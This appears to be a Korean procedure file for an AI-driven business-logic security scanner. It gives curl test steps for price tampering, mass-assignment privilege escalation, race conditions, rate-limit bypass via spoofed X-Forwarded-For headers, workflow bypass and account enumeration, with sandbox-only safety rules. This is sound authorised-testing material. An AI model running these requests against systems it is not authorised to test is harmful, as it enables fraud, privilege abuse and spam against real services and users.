### Phase 2: 동적 테스트 (검증)

> 공통 시작 절차 / 공통 검증 기준은 `guidelines/phase2.md` 지침 7에 정의되어 있다. 이 파일은 비즈니스 로직 스캐너의 고유 절차만 다룬다.

**도구 선택:** 상태 변경 API에 대한 curl 요청으로 충분하다. 브라우저 렌더링이 필요한 테스트가 아니므로 Playwright는 사용하지 않는다.

**계정 요구사항:** 최소 2개 계정.
- **계정 A**: 정당한 리소스 소유자
- **계정 B**: 비소유자 / 외부 공격자 역할

---

## [필수] 쓰기 작업 안전 수칙

이 스캐너의 동적 테스트는 **상태 변경 API에 실제 쓰기 작업**을 수행한다. 다른 스캐너의 Phase 2와 달리 서버 상태가 돌이킬 수 없게 변경될 수 있다.

- **sandbox 도메인에서만 수행한다.** prod/cbt/staging은 절대 금지. 사용자가 제공한 도메인이 sandbox인지 불분명하면 반드시 확인한다.
- **파괴적 행위 절대 금지**: 회원 탈퇴, 비밀번호 변경, 이메일/전화번호 변경, 프로덕션 쿠폰 소진, 실제 결제, 데이터 영구 삭제.
- **결제 시나리오 가드**: `POST /payments/charge` 등 결제 엔드포인트는 PG 모킹/dry-run 모드가 확인된 경우에만 호출. 확인 불가하면 해당 시나리오는 "후보(환경 제한)"로 유지하고 호출하지 않는다.
- **테스트용 데이터는 직접 생성**한다. 기존 데이터를 수정/삭제하지 않는다. (주문 테스트라면 신규 주문을 생성한 뒤 그 주문을 대상으로 테스트)
- **Phase 1 후보의 실제 URL 경로가 확정되지 않은 경우** 동적 테스트를 시작하지 않는다. 경로 없이 유추로 요청을 보내지 않는다.
- **테스트 종료 후 정리**: 라벨별 테스트가 끝나면 생성된 리소스 ID(주문, 변조된 상태)와 변경된 계정 속성(role 등)을 기록하고, 가능한 정리 API로 원복을 시도한다. 자동 원복이 불가능하면 사용자에게 정리 목록을 보고한다. 특히 `PRIV_ESCALATION` 테스트 후에는 계정 A의 role을 원래 값으로 PATCH 시도.

---

## 테스트 식별자 사전 획득

`guidelines/phase2.md` 지침 3에 따라 curl 명령에 `<placeholder>`를 남기지 않는다. 각 라벨 테스트 전에 아래를 먼저 획득한다.

- 계정 A/B의 세션 쿠키 또는 토큰 (지침 9의 우선순위에 따라 획득)
- 테스트 대상 리소스 ID (주문, 쿠폰, 게시글 등): 정상 요청으로 신규 생성한 뒤 응답에서 추출
- CSRF 토큰이 필요한 엔드포인트: 폼/프리플라이트 요청으로 선획득

획득 불가능한 정보(외부 콜백 URL, OTP 등)만 사용자에게 요청한다.

---

## 라벨별 테스트 절차

`phase1.md`에서 부여한 라벨을 섹션 제목으로 사용한다.

### `PRICE_TAMPER` — 가격/수량 조작

1. 정상 주문/결제 요청을 한 번 캡처한다 (계정 A).
2. 요청 바디의 `price`/`amount`/`totalPrice`/`discount`/`quantity` 필드를 아래 값으로 변조하여 재전송:
   - 음수(`-10000`), 0, 1원
   - 100% 초과 할인(`discount: 101`)
   - 극대값(`quantity: 999999999`)
   - 소수점(`quantity: 0.001`)
3. 응답 + 주문 재조회로 반영 여부 확인.

```
curl -X POST "https://<host>/api/orders" \
  -H "Cookie: SESSION=<계정A 세션>" \
  -H "Content-Type: application/json" \
  -d '{"productId": "<획득한 productId>", "quantity": 1, "price": -10000}'

curl -s "https://<host>/api/orders/<생성된 orderId>" \
  -H "Cookie: SESSION=<계정A 세션>"
```
- 확인됨: 변조된 금액으로 주문이 생성되거나 잔액이 음수 방향으로 차감됨

### `PRIV_ESCALATION` — 권한 상승 (mass assignment)

1. 계정 A(일반 사용자)로 자기 프로필 업데이트 요청에 권한 필드를 추가 전송한다.
2. **본인 재로그인 또는 권한 재조회**까지 수행한다. mass assignment가 DB에만 반영되고 기존 JWT에는 없는 경우가 있다.
3. 테스트 종료 후 role을 원래 값으로 되돌린다.

```
curl -X PATCH "https://<host>/api/users/me" \
  -H "Cookie: SESSION=<계정A 세션>" \
  -H "Content-Type: application/json" \
  -d '{"nickname": "test", "role": "admin", "isAdmin": true, "permissions": ["ADMIN"]}'

curl -s "https://<host>/api/users/me" \
  -H "Cookie: SESSION=<계정A 세션>"

curl -si "https://<host>/api/admin/users" \
  -H "Cookie: SESSION=<계정A 세션>"
```
- 확인됨: 재조회 결과에서 role/권한 필드가 바뀌거나, 관리자 전용 엔드포인트 접근이 허용됨

### `RACE_CONDITION` — 레이스 / TOCTOU

`guidelines/phase2.md` 지침 5의 race 예외 적용: **단일 Bash 호출** 내부에서 쉘 백그라운드로 병렬 발사. 별도 Bash 호출 병렬은 여전히 금지.

대상: 쿠폰 1회 사용 제한, 잔액 차감, 재고 감소, 투표/좋아요 1인 1회 제한.

증거 수집을 위해 응답을 파일로 저장하고 분포를 집계한다.

```
URL="https://<host>/api/coupons/apply"
SESSION="<계정A 세션>"
PAYLOAD='{"couponCode": "<선획득 쿠폰 코드>"}'
TMPDIR=$(mktemp -d)

for i in $(seq 1 10); do
  curl -s -o "$TMPDIR/race_$i.body" \
    -w "%{http_code}\n" \
    -X POST "$URL" \
    -H "Cookie: SESSION=$SESSION" \
    -H "Content-Type: application/json" \
    -d "$PAYLOAD" >> "$TMPDIR/race.codes" &
done
wait

echo "=== 상태코드 분포 ==="
sort "$TMPDIR/race.codes" | uniq -c

echo "=== 응답 본문 첫 줄 분포 ==="
head -n1 "$TMPDIR"/race_*.body | sort | uniq -c

curl -s "https://<host>/api/users/me/coupons" -H "Cookie: SESSION=$SESSION"
```
- 확인됨: 1회 사용 제한 쿠폰이 2회 이상 적용되거나, 잔액이 보유액을 초과하여 차감되거나, 재고가 마이너스로 감소함. 200 응답 개수 분포 + 상태 재조회 결과를 증거로 첨부한다.

### `FEATURE_ABUSE` — Rate Limit 우회 / 기능 남용

대상: SMS/이메일/OTP 발송, 파일 업로드, 로그인 시도. **결제/회원 탈퇴/비밀번호 변경 엔드포인트는 제외**.

```
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}s\n" \
    -X POST "https://<host>/api/auth/send-otp" \
    -H "Content-Type: application/json" \
    -d '{"phone": "<계정A 전화번호>"}'
done
```

추가 우회 시도:
- IP 기반 rate limit만 있는 경우:
  ```
  curl -s -X POST "https://<host>/api/auth/send-otp" \
    -H "X-Forwarded-For: $((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))" \
    -H "Content-Type: application/json" \
    -d '{"phone": "<계정A 전화번호>"}'
  ```
- 세션 기반: 재로그인 후 카운터 초기화 여부 확인

- 확인됨: 전량 200 응답 + 429/`Retry-After` 미발동 + 응답 본문에서 실제 발송 성공 메시지 확인

### `STATE_BYPASS` — 상태 머신 우회

대상: 주문/결제/승인/신청 워크플로우.

1. Phase 1에서 식별된 상태 전이 흐름을 캡처 (예: `pending → paid → shipped → delivered`).
2. 계정 A로 신규 주문을 `pending` 상태로 생성한다.
3. 중간 단계를 **건너뛰고** 최종 단계 API를 직접 호출한다.

```
curl -X PATCH "https://<host>/api/orders/<생성된 orderId>" \
  -H "Cookie: SESSION=<계정A 세션>" \
  -H "Content-Type: application/json" \
  -d '{"status": "delivered"}'

curl -X POST "https://<host>/api/orders/<생성된 orderId>/complete" \
  -H "Cookie: SESSION=<계정A 세션>"

curl -s "https://<host>/api/orders/<생성된 orderId>" \
  -H "Cookie: SESSION=<계정A 세션>"
```
- 확인됨: 이전 단계(결제 등) 없이 최종 상태로 전이 성공

### `DATA_INTEGRITY` — 데이터 정합성

세 가지 시나리오를 순서대로 시도한다. **#3(중복 결제)은 PG 모킹/dry-run 모드 확인 후에만 수행**. 확인 불가 시 후보(환경 제한)로 유지.

```
# 1. 자기 자신 대상 작업 (자기 송금 / 자기 팔로우 / 자기 평가)
curl -X POST "https://<host>/api/transfer" \
  -H "Cookie: SESSION=<계정A 세션>" \
  -H "Content-Type: application/json" \
  -d '{"toUserId": "<계정A userId>", "amount": 1000}'

# 2. 만료된 쿠폰/토큰 사용
curl -X POST "https://<host>/api/coupons/apply" \
  -H "Cookie: SESSION=<계정A 세션>" \
  -d '{"couponCode": "<만료된 쿠폰 코드>"}'

# 3. 동일 요청 2회 연속 (Idempotency-Key 없이) — PG 모킹 환경 한정
curl -X POST "https://<host>/api/payments/charge" \
  -H "Cookie: SESSION=<계정A 세션>" \
  -d '{"orderId": "<생성된 orderId>", "amount": 1000}'
curl -X POST "https://<host>/api/payments/charge" \
  -H "Cookie: SESSION=<계정A 세션>" \
  -d '{"orderId": "<생성된 orderId>", "amount": 1000}'
```
- 확인됨: 자기 송금 성공 / 만료 쿠폰 적용 성공 / 중복 결제 2건 모두 성공

### `INFO_DISCLOSURE` — 비즈니스 정보 노출

```
# 1. 계정 존재 여부 에러 메시지 diff — 가능한 경우 별도 check 엔드포인트 우선 사용
#    별도 엔드포인트가 없을 때만 signup 호출. signup 호출 시 더미 데이터 누적 주의
curl -s -X POST "https://<host>/api/auth/check-email" \
  -H "Content-Type: application/json" \
  -d '{"email": "<이미 가입된 이메일>"}'

curl -s -X POST "https://<host>/api/auth/check-email" \
  -H "Content-Type: application/json" \
  -d '{"email": "nonexistent-<랜덤>@example.com"}'

# 2. 페이지네이션으로 전체 건수 노출
curl -s "https://<host>/api/posts?page=1&size=1" \
  -H "Cookie: SESSION=<계정A 세션>" | grep -iE '"(total|totalCount|count|totalElements)"'

# 3. 응답에 디버그/내부 필드 포함 여부
curl -s "https://<host>/api/users/me" \
  -H "Cookie: SESSION=<계정A 세션>" | grep -iE 'password|_debug|internal|stackTrace'
```
- 확인됨: 에러/응답 메시지로 계정 존재 여부 구분 가능 / 응답 메타에 total/count 노출 / 응답에 내부 필드(해시된 비밀번호, 내부 ID 등) 노출

---

**검증 기준 (스캐너 고유 부분만):**
- **확인됨**: 동적 테스트에서 비즈니스 규칙 위반이 실제로 재현된 것을 직접 확인함 (예: 음수 금액 주문 성공, 일반 사용자가 admin 권한 획득, 레이스로 잔액 초과 차감, 만료 쿠폰 적용 성공). 각 항목별로 curl 명령 + HTTP 응답 본문(또는 race 분포 출력)을 증거로 첨부한다.
- **보고서 제외 (스캐너 고유)**: 서버 재검증 / 트랜잭션 + 행 잠금 / FSM 상태 전이 검증 / Rate limiter / DTO Allowlist 등 방어 로직이 동적 테스트로 실제 차단한 것이 확인된 경우.
